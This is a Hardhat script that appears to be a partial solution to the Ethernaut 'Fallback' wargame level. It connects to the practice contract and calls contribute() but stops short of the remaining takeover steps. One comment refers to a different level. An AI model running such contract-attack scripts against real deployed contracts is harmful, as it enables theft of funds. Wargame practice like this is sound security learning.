import { ethers } from "hardhat";

const attackFallback = async () => {
    // change contract addresses here.
    const fallbackAddress = "0x25d44eB1C5F7Ea6d32B11c7a28A5dBB9251f3417"; //type "await contract.address()" in ethernaut console

    // Don't touch below 🚀
    // Vulnerability from public view of password
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            stateMutability: "nonpayable",
            type: "constructor",
            constant: undefined,
            payable: undefined,
        },
        {
            inputs: [],
            name: "contribute",
            outputs: [],
            payable: true,
            stateMutability: "payable",
            type: "function",
        },
        {
            inputs: [{ internalType: "address", name: "", type: "address" }],
            name: "contributions",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "getContribution",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "withdraw",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            constant: true,
            name: "infoNum",
            payable: true,
            stateMutability: "payable",
            type: "receive",
        },
    ];
    const contract = await ethers.getContractAt(ABI, fallbackAddress);
    const tx1 = await contract.contribute();
    console.log(tx1);

    // console.log(`Passed this level: ${""}`);
    // console.log("You may submit at ethernaut if above state 'true'");
};

attackFallback()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
